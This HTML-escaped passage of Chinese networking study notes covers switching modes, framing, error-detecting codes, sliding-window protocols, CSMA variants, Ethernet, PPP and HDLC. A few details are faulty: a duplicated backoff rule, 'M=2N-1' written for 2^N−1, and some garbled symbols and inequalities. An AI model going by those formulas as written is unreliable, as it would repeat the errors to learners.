&lt;td&gt;需要&lt;/td&gt;
&lt;td&gt;不需要&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;专用物理路径&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;每个分组沿着规定的路径&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;分组按序到达&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;路由器的瘫痪对整体产生影响&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;可用带宽&lt;/td&gt;
&lt;td&gt;固定&lt;/td&gt;
&lt;td&gt;动态&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;可能拥塞的时间点&lt;/td&gt;
&lt;td&gt;建立呼叫连接的时候&lt;/td&gt;
&lt;td&gt;每个分组传送的时候&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;可能有浪费的带宽&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;使用存储转发&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;透明性&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;数据报与虚电路&#34;&gt;数据报与虚电路&lt;/h4&gt;
&lt;p&gt;数据报&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;发送分组前无需建立连接&lt;/li&gt;
&lt;li&gt;网络尽最大努力交付，传输不保证可靠性，有可能丢失&lt;/li&gt;
&lt;li&gt;在具有多个分组的报文中，交换机尚未接受完第二个分组，已经收到的第一个分组就可以转发出去，不仅减小了延迟，而且大大提高了吞吐量&lt;/li&gt;
&lt;li&gt;当某一台交换机或一段链路故障时，可相应地更新转发表，寻找到另一条替代路径转发分组，对故障适应能力强&lt;/li&gt;
&lt;li&gt;发送方和接收方不独占某一链路，资源利用率高&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;虚电路&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户之间必须建立通信连接，数据传输过程中不再需要寻找路径，相对数据包方式时延较小&lt;/li&gt;
&lt;li&gt;通常分组走同样的路径，所以分组一定是按序到达目的主机的&lt;/li&gt;
&lt;li&gt;分组首部并不包含目的地址，而是包含虚电路标识符，相对数据报方式开销小&lt;/li&gt;
&lt;li&gt;当某个交换机或某条链路出现故障彻底失效时，所有经过该交换机或该链路的虚电路将遭到破坏&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;比较标准&lt;/th&gt;
&lt;th&gt;数据报服务&lt;/th&gt;
&lt;th&gt;虚电路服务&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;连接的建立&lt;/td&gt;
&lt;td&gt;无需建立连接&lt;/td&gt;
&lt;td&gt;需要建立连接&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;地址信息&lt;/td&gt;
&lt;td&gt;每个分组包含完整的源地址和目的地址&lt;/td&gt;
&lt;td&gt;每个分组包含一个虚电路号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;状态信息&lt;/td&gt;
&lt;td&gt;路由器不保留任何有关连接的状态信息&lt;/td&gt;
&lt;td&gt;每个虚电路都要求路由器为每个连接建立表项&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;分组的转发&lt;/td&gt;
&lt;td&gt;单个分组独立转发&lt;/td&gt;
&lt;td&gt;根据预定路径转发&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;路由器失效的影响&lt;/td&gt;
&lt;td&gt;每个分组独立处理，影响局部&lt;/td&gt;
&lt;td&gt;影响已建立的所有连接&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;端到端的差错处理&lt;/td&gt;
&lt;td&gt;由主机负责&lt;/td&gt;
&lt;td&gt;由通信子网负责&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;端到端的流量控制&lt;/td&gt;
&lt;td&gt;由主机负责&lt;/td&gt;
&lt;td&gt;由通信子网负责&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;分组的顺序&lt;/td&gt;
&lt;td&gt;无序&lt;/td&gt;
&lt;td&gt;保持顺序&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;思路&lt;/td&gt;
&lt;td&gt;可靠通信由用户主机来保证&lt;/td&gt;
&lt;td&gt;可靠通信由网络来保证&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;注：数据报服务和虚电路服务都由网络层提供&lt;/p&gt;
&lt;h3 id=&#34;传输介质&#34;&gt;传输介质&lt;/h3&gt;
&lt;h4 id=&#34;传输介质分类&#34;&gt;传输介质分类&lt;/h4&gt;
&lt;p&gt;导向型传输介质：包含双绞线、同轴电缆和光纤&lt;/p&gt;
&lt;h3 id=&#34;物理层设备&#34;&gt;物理层设备&lt;/h3&gt;
&lt;h4 id=&#34;中继器&#34;&gt;中继器&lt;/h4&gt;
&lt;p&gt;放大器放大的是模拟信号，中继器放大的是数字信号&lt;/p&gt;
&lt;h4 id=&#34;集线器&#34;&gt;集线器&lt;/h4&gt;
&lt;p&gt;集线器不能隔离冲突域&lt;/p&gt;
&lt;h2 id=&#34;数据链路层&#34;&gt;数据链路层&lt;/h2&gt;
&lt;h3 id=&#34;数据链路层的功能&#34;&gt;数据链路层的功能&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;链路管理：负责数据链路的建立、维持和释放，主要用于面向连接的服务&lt;/li&gt;
&lt;li&gt;帧同步：接收方确定收到的比特流中一帧的开始位置与结束位置&lt;/li&gt;
&lt;li&gt;差错控制：用于使接收方确定接收到的数据就是由发送发送的数据&lt;/li&gt;
&lt;li&gt;透明传输：不管数据是什么样的比特组合都应当能在链路上传送&lt;/li&gt;
&lt;/ol&gt;



&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;帧定界&lt;br&gt;
解析：当两个主机互相传送信息时，网络层的分组必须封装成帧，并以帧的格式进行传送。将一段数据的前后分别添加首部和尾部，就构成了帧。首部和尾部中含有很多控制信息，这些信息的重要作用之一是确定帧的界限，即帧定界。例如在HDLC协议中的帧格式使用标志F(01111110)来标识帧的开始和结束&lt;/p&gt;&lt;/div&gt;

&lt;h3 id=&#34;组帧&#34;&gt;组帧&lt;/h3&gt;
&lt;p&gt;组帧的优点：如果出错只需发送出错的帧即可&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;字符计数法&lt;/li&gt;
&lt;li&gt;字节填充的首尾界符法&lt;/li&gt;
&lt;li&gt;比特填充的首尾标志法&lt;/li&gt;
&lt;li&gt;物理编码违例法&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;注：在使用字节填充的首尾界符法时，并不是所有形式的帧都需要帧开始符和帧结束符&lt;/p&gt;
&lt;h3 id=&#34;差错控制&#34;&gt;差错控制&lt;/h3&gt;
&lt;h4 id=&#34;检错编码&#34;&gt;检错编码&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;奇偶校验码&lt;br&gt;
在信息码后面加一位校验码，分奇校验和偶校验&lt;br&gt;
奇校验：添加一位校验码后，使得整个码字里面1的个数是奇数。接收端收到数据后就校验数据里1的个数，若检测到奇数个1，则认为传输没有出错；若检测到偶数个1，则说明传输过程中，数据发生了改变，要求重发&lt;br&gt;
偶校验：添加一位校验码后，使得整个码字里面1的个数是偶数。接收端收到数据后就校验数据里1的个数，若检测到偶数个1，则认为传输没有出错；若检测到奇数个1，则说明传输过程中，数据发生了改变，要求重发&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;循环冗余码&lt;br&gt;
学会二进制除法即可
&lt;img src=&#34;https://xuoneyuan.github.io/images/jw-1.png&#34; alt=&#34;crc&#34; title=&#34;示例&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;纠错编码&#34;&gt;纠错编码&lt;/h4&gt;
&lt;p&gt;海明码：在信息字段中插入若干位数据用于监督码字里的哪一位数据发生了变化，具有一位纠错能力&lt;/p&gt;
&lt;p&gt;具体求解步骤如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;确定校验码的位数r&lt;/li&gt;
&lt;li&gt;确定校验码的位置&lt;/li&gt;
&lt;li&gt;确定数据的位置&lt;/li&gt;
&lt;li&gt;求出校验位的值&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;流量控制与可靠传输机制&#34;&gt;流量控制与可靠传输机制&lt;/h3&gt;
&lt;h4 id=&#34;流量控制&#34;&gt;流量控制&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;停止-等待流量控制&lt;br&gt;
发送方发出一帧，然后等待应答信号到达再发送下一帧；接收方每收到一帧后，返回一个应答信号，表示可以接收下一帧&lt;/li&gt;
&lt;li&gt;滑动窗口流量控制&lt;br&gt;
在任意时刻，发送方都维持了一组连续的允许发送的帧序号，称为发送窗口。同时接收方也维持了一组连续的允许接收的帧的序号，称为接收窗口。发送窗口和接收窗口的序号的上下界不一定要一样，甚至大小也可以不同。发送方窗口内的序列号代表了已经被发送但是还没有被确认的帧，或者是可以被发送的帧。发送端每收到一个帧的确认，发送窗口就向前滑动一个帧的位置。当发送窗口尺寸达到最大尺寸时，发送方会强行关闭网络层，直到出现一个空闲缓冲区。在接收端只有当收到的数据帧的发送序号落入接收窗口内才允许将该数据帧收下，并将窗口前移一个位置。若接收到的数据帧落在接收窗口之外，则一律将其丢弃。
&lt;img src=&#34;https://xuoneyuan.github.io/images/jw-2.png&#34; alt=&#34;slide&#34; title=&#34;滑动窗口流量控制的发送窗口&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;可靠传输机制&#34;&gt;可靠传输机制&lt;/h4&gt;
&lt;p&gt;总结可靠传输与无差错接收的区别&lt;br&gt;
解析：在数据链路层若仅仅使用了循环冗余码检验差错检测技术，只能做到对帧的无差错接收，接收端虽然收到了帧，但最终还是因为有差错被丢弃，即没有被接收&lt;/p&gt;
&lt;h4 id=&#34;滑动窗口机制&#34;&gt;滑动窗口机制&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;只有在接收窗口向前滑动时，发送窗口才有可能向前滑动&lt;/li&gt;
&lt;li&gt;可靠传输机制包括3种协议只是在发送窗口和接收窗口大小上有所差别&lt;br&gt;
停止-等待协议：发送窗口大小=1，接收窗口大小=1&lt;br&gt;
后退N帧协议：发送窗口大小&amp;gt;1，接收窗口大小=1&lt;br&gt;
选择重传协议：发送窗口大小&amp;gt;1，接收窗口大小&amp;gt;1&lt;/li&gt;
&lt;li&gt;当接收窗口的大小为1时，一定可保证帧按序接收&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;停止-等待协议&#34;&gt;停止-等待协议&lt;/h4&gt;
&lt;p&gt;基本思想：发送方传输一个帧后，必须等待对方的确认才能发送下一帧。若在规定时间内没有收到确认，则发送方超时，并重传原始帧&lt;/p&gt;
&lt;p&gt;出现的差错主要有以下两类：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;第一类错误就是数据帧被损坏或者丢失 &lt;br&gt;
处理数据帧被损坏的情况时，使用计时器即可解决。发送方在发送一个帧后，若数据能够被正确地接收到，则接收方就发送一个确认帧；若接收方收到的是一个被损坏的数据帧，则直接丢弃，只要计时器超过了发送方就会重新发送该数据帧，重复直至数据帧无错误地到达接收方为止&lt;/li&gt;
&lt;li&gt;第二类错误是确认帧被破坏或者丢失&lt;br&gt;
解决方法就是让发送方在每个待发的帧头部加一个编号，而接收方对每个到达的帧的编号进行识别，判断是新帧还是要抛弃的重复帧&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;后退n帧gbn协议&#34;&gt;后退N帧(GBN)协议&lt;/h4&gt;
&lt;p&gt;基本原理：发送方发送完一个数据帧后，不是停下来等待确认帧，而是可以连续再发送若干个数据帧，如果这时收到了接收方的确认帧，那么还可以接着发送数据帧。如果某个帧出错了，接收方只能简单地丢弃该帧及其所有的后续帧。发送方超时后需要重发该出错帧及其后续的所有帧



&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;为什么后退N帧协议的发送窗口尺寸W,必须满足1&amp;lt;W≤2&lt;sup&gt;n&lt;/sup&gt;-1?&lt;/p&gt;
&lt;p&gt;解析:假设发送窗口的大小为2&lt;sup&gt;n&lt;/sup&gt;,发送方发送了0号帧,接收窗口发送ACKI（0号帧已收到，希望接收1号帧，但是ACK1丢失)，接着发送方发送了1号帧，接收窗口发送ACK2(1号帧已收到，希望接收2号帧，但是 ACK2丢失)，以此类推，直到发送方发了第2&lt;sup&gt;n&lt;/sup&gt;-1号帧，接收方发送 ACK2&lt;sup&gt;n&lt;/sup&gt;(丢失)，此时不能再发送数据了，因为已经发送了2个帧，但一个确认都没有收到，所以一段时间后0号帧的计时器会到达预定时间进行重发，此时接收方认为发过来的是新一轮的0号帧还是旧一轮的重传呢?接收方并不知道，很有可能接收方就把该0号帧当作新一轮的帧接收了，但实际上这个0号帧是重传的，所以出现了错误，即发送窗口的大小不可能为2&lt;sup&gt;n&lt;/sup&gt;。现在假设发送窗口的大小为2&lt;sup&gt;n&lt;/sup&gt;-1，情况和上面一样，发送方发送了0~2&lt;sup&gt;n&lt;/sup&gt;-2号帧，接收方发送的确认帧都丢失了，如果没有丢失就应该接着传2&lt;sup&gt;n&lt;/sup&gt;-1号帧，但是丢失了，发送方应该发送0号帧。由于这种情况接收方可以判断出来(下一帧只要不是第2&lt;sup&gt;n&lt;/sup&gt;1号帧就是重传），因此不会发生错误。如果发送窗口尺寸小于2&lt;sup&gt;n&lt;/sup&gt;-1，那就更不会发生错误了。&lt;br&gt;
综上所述，后退N帧协议的最大发送窗口是2&lt;sup&gt;n&lt;/sup&gt;-1&lt;/p&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;h4 id=&#34;选择重传sr协议&#34;&gt;选择重传(SR)协议&lt;/h4&gt;
&lt;p&gt;基本思想：若一帧出错，则其后续帧先存入接收方的缓冲区中，同时要求发送方重传出错帧，一旦收到重传帧后，就和原先存在缓冲区的其余帧一起按正确的顺序送至主机



&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;为什么选择重传协议的最大发送窗口的大小是2&lt;sup&gt;n-1&lt;/sup&gt;?&lt;br&gt;
解析:现在先假设选择重传协议的最大发送窗口是W,那么可以一次性发送0~W-1号帧，并且接收方都已经接收到了，但是这W个确认帧全部都在传输的过程中丢失了，此时接收窗口的位置已经移动到W~2W-1。如果发送方再发一轮，这W个帧应该落在W～2W-1，但是此时的W帧是重传的，所以若要正确，就必须满足2W-1是在最大序号2&lt;sup&gt;n&lt;/sup&gt;-1之内，也就是说2W-1≤2&lt;sup&gt;n&lt;/sup&gt;-1，即W&amp;lt;2&lt;sup&gt;n-1&lt;/sup&gt;。综上所述，选择重传协议的最大发送窗口是2&lt;sup&gt;n-1&lt;/sup&gt;。&lt;/li&gt;
&lt;li&gt;假设n=3，2-=4，若发送窗口为5，则接收窗口为5。假设t时刻发送方发送序号为0~4的帧，t时刻接收方接收到序号为0~4的帧，接收窗口滑动到[5,6,7,0,1]，并发送0~4号的确认帧。但是确认帧在传输中都丢失了。于是，发送方在t3时刻重发帧0。当t时刻接收方收到帧0时，由于帧0在其接收范围，0被错误地当作新帧接收，导致协议错误。因此，对于选择重传协议，必须使发送窗口的大小小于或等于2&lt;sup&gt;n-1&lt;/sup&gt;。&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;介质访问控制&#34;&gt;介质访问控制&lt;/h3&gt;
&lt;h4 id=&#34;介质访问控制分类&#34;&gt;介质访问控制分类&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;信道划分&lt;/li&gt;
&lt;li&gt;随机访问&lt;/li&gt;
&lt;li&gt;轮询访问
1是静态分配信道的方法，2、3是动态分配信道的方法&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;信道划分介质访问控制&#34;&gt;信道划分介质访问控制&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;频分多路复用&lt;/li&gt;
&lt;li&gt;时分多路复用&lt;/li&gt;
&lt;li&gt;波分多路复用&lt;/li&gt;
&lt;li&gt;码分多路复用&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;随机访问介质访问控制&#34;&gt;随机访问介质访问控制&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;ALOHA协议&lt;br&gt;
当网络中的任何一个节点需要发送数据时，可以不进行任何检测就发送数据。如果在一段时间内没有收到确认，该节点就认为传输过程中发生了冲突。发生冲突的节点需要等待一段随机时间后再发送数据，直至发送成功为止。&lt;/li&gt;
&lt;li&gt;CSMA协议&lt;br&gt;
载波侦听多路访问（CSMA）协议是在 ALOHA 协议的基础上改进而来的一种多路访问控制协议。在CSMA中，每个节点发送数据之前都使用载波侦听技术来判定通信信道是否空闲。常用的CSMA有以下3种策略。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;1-坚持 CSMA:当发送节点监听到信道空闲时，立即发送数据，否则继续监听。&lt;/li&gt;
&lt;li&gt;p-坚持 CSMA:当发送节点监听到信道空闲时，以概率p发送数据，以概率1-p延迟一段时间并重新监听。&lt;/li&gt;
&lt;li&gt;非坚持CSMA:当发送节点一旦监听到信道空闲时，立即发送数据，否则延迟一段随机的时间再重新监听。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;
&lt;p&gt;CSMA/CD协议&lt;br&gt;
CSMA/CD全称为带冲突检测的载波侦听多路访问协议，它是在局域网中被广泛应用的介质访问控制协议。&lt;br&gt;
CSMA/CD 工作流程:每个站在发送数据之前要先检测一下总线上是否有其他计算机在发送数据，若有，则暂时不发送数据，以免发生冲突;若没有，则发送数据。计算机在发送数据的同时检测信道上是否有冲突发生，若有，则采用截断二进制指数类型退避算法来等待一段随机时间后再次重发。总体来说，可概括为“先听后发，边听边发，冲突停发，随机重发”。



&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;在二进制指数后退算法中，N次碰撞之后，站点会在0~M之间选择一个随机数，分以下3类情况讨论。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;当1≤N≤10时，M=2N-1&lt;/li&gt;
&lt;li&gt;当1≤N≤10时，M=2N-1&lt;/li&gt;
&lt;li&gt;当N=16时，直接丢弃，并给计算机发送一个错误报告&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;注意:二进制指数后退算法解决了站点检测到冲突后继续等待的时间问题&lt;/p&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CSMA/CA协议&lt;br&gt;
CSMA/CA主要用在无线局域网中，由IEEE 802.11标准定义，它在 CSMA 的基础上增加了冲突避免的功能。冲突避免要求每个节点在发送数据之前监听信道。如果信道空闲，则发送数据。发送节点在发送完一个帧后，必须等待一段时间(称为帧间间隔)，检查接收方是否发回帧的确认。若收到确认，则表明无冲突发生;若在规定时间内没有收到确认，表明出现冲突，重发该帧。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;局域网&#34;&gt;局域网&lt;/h3&gt;
&lt;h4 id=&#34;局域网的基本概念与体系结构&#34;&gt;局域网的基本概念与体系结构&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;局域网最主要的特点&lt;/li&gt;
&lt;li&gt;局域网的主要优点&lt;/li&gt;
&lt;li&gt;局域网的主要技术要素&lt;/li&gt;
&lt;li&gt;局域网的主要拓扑结构&lt;/li&gt;
&lt;li&gt;局域网的主要传输介质&lt;/li&gt;
&lt;li&gt;局域网的主要介质访问控制方法&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;以太网的工作原理&#34;&gt;以太网的工作原理&lt;/h4&gt;
&lt;p&gt;以太网采用总线拓扑结构，所有计算机都共享一条总线，信息以广播方式发送。为了保证数据通信的方便性和可靠性，以太网使用了CSMA/CD技术对总线进行访问控制。考虑到局域网信道质量好，以太网采取了以下两项重要的措施以使通信更加简便&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;采用无连接的工作方式&lt;/li&gt;
&lt;li&gt;不对发送的数据帧进行编号，也不要求对发送方发送确认&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;因此以太网提供的服务是不可靠的服务,即尽最大努力交付,差错的纠正由传输层的TCP完成&lt;/p&gt;
&lt;h4 id=&#34;以太网的mac帧&#34;&gt;以太网的MAC帧&lt;/h4&gt;
&lt;p&gt;局域网中的每台计算机都有一个唯一的号码，称为MAC 地址或物理地址、硬件地址。每块网卡出厂即被赋予一个全球唯一的MAC地址,它被固化在网卡的ROM中,共48bit(6B)&lt;/p&gt;
&lt;h4 id=&#34;以太网的传输介质&#34;&gt;以太网的传输介质&lt;/h4&gt;
&lt;p&gt;传统以太网可使用的传输介质有4种，即粗缆、细缆、双绞线和光纤。对应的，MAC层下面给出了这4种传输介质的物理层，即10Base5（粗缆)、10Base2(细缆)、10Base-T(双绞线）和10Base-F(光纤)。其中，Base是指电缆上的信号为基带信号，采用曼彻斯特编码;Base前面的10表示数据传输速率为10Mbit/s;Base后面的5或2表示每一段电缆最长为500m或200m(实为185m);T表示双绞线，F表示光纤。&lt;/p&gt;



&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;以太网的MAC协议提供的是无连接不可靠服务&lt;br&gt;
有连接与无连接的判断:MAC 帧首部格式中只有目的 MAC 地址、源MAC地址和类型字段，并没有建立连接的字段，所以以太网MAC协议提供的是无连接的服务&lt;br&gt;
可靠与不可靠的判断:以太网帧是一种无编号的帧，当目的站收到有差错的数据帧时，就丢弃此帧，其他什么也不做，差错的纠正由高层来决定，所以以太网的MAC 协议是不可靠的&lt;/p&gt;&lt;/div&gt;

&lt;h3 id=&#34;广域网&#34;&gt;广域网&lt;/h3&gt;
&lt;h4 id=&#34;广域网的基本概念&#34;&gt;广域网的基本概念&lt;/h4&gt;



&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;从层次上考虑，广域网和局域网的区别很大，局域网使用的协议主要在数据链路层，而广域网使用的协议主要在网络层&lt;/p&gt;
&lt;p&gt;广域网中存在一个最重要的问题，即路由选择和分组转发。路由选择协议负责搜索分组从某个节点到目的节点的最佳传输路由，以便构造路由表。从路由表再构造出转发分组的转发表，分组是通过转发表进行转发的&lt;/p&gt;&lt;/div&gt;

&lt;h4 id=&#34;ppp&#34;&gt;PPP&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;PPP是一个面向字节的协议&lt;/li&gt;
&lt;li&gt;PPP不需要的功能:纠错（PPP只负责检错)、流量控制（由TCP负责)、序号(PPP是不可靠传输协议，所以不需要对帧进行编号)、多点线路(PPP是点对点的通信方式)、半双工或单工（PPP只支持全双工链路）&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;hdlc协议&#34;&gt;HDLC协议&lt;/h4&gt;
&lt;p&gt;高级数据链路控制（HDLC）协议是ISO制定的面向比特(PPP是面向字节的，这个要记住）的数据链路控制协议。它可适用于链路的两种基本配置:非平衡配置和平衡配置



&lt;div class=&#34;notice notice-tip&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;PPP的帧格式和 HDLC协议的帧格式的区别&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PPP是面向字节的，而HDLC 协议是面向比特的。可以看出，PPP应该使用字节填充，而HDLC协议应该使用比特填充&lt;/li&gt;
&lt;li&gt;PPP帧比HDLC 协议帧多一个2字节的协议字段。当协议字段值为0x0021时,表示信息字段是护数据报&lt;/li&gt;
&lt;li&gt;PPP不使用序号和确认机制，只保证无差错接收（通过硬件进行循环冗余码校验)，而端到端差错检测由高层协议完成。HDLC 协议的信息帧使用了编号和确认机制&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;数据链路层设备&#34;&gt;数据链路层设备&lt;/h3&gt;
&lt;h4 id=&#34;网桥的概念和基本原理&#34;&gt;网桥的概念和基本原理&lt;/h4&gt;
&lt;p&gt;在数据链路层扩展局域网使用的是网桥。网桥工作在数据链路层，其特点是具有过滤帧的功能。网桥至少有两个端口，每个端口与一个网段相连。网桥每从一个端口接收到一个帧，就先暂存到缓存中。若该帧未出现差错，且欲发往的目的站MAC地址属于另一个网段（同一个网段无需转发，应该丢弃)，则通过查找转发表，将该帧从对应的端口发出。因此，仅在同一个网段中通信的帧，不会被网桥转发到另一个网段中，因而不会加重整个网络的负担。&lt;/p&gt;
&lt;h4 id=&#34;以太网交换机及其工作原理&#34;&gt;以太网交换机及其工作原理&lt;/h4&gt;
